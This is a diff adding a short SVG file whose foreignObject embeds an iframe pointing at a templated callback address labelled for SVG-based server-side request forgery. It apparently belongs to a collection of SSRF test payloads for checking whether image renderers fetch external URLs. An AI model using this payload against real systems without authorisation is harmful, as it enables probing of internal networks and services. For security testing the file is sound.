@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" width="1000" height="1000">
+<foreignObject width="1000" height="1000">
+	<iframe  xmlns="http://www.w3.org/1999/xhtml" src="TARGET_SCHEME://ssrf-svg-foreignobj-iframe-src.TARGET_DOMAIN:TARGET_PORT/"></iframe>
+</foreignObject>
+</svg>
+
